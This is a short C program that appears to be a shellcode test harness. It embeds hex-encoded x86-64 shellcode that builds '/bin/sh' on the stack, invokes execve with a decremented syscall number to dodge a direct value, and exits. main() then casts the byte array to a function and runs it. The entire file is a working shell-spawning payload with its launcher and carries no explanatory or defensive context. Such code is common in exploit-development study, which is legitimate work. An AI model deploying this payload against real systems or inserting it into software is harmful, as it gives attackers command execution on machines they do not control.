#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xd2\xfc\x48\xf7\xe2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3c\x48\xff\xc8\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	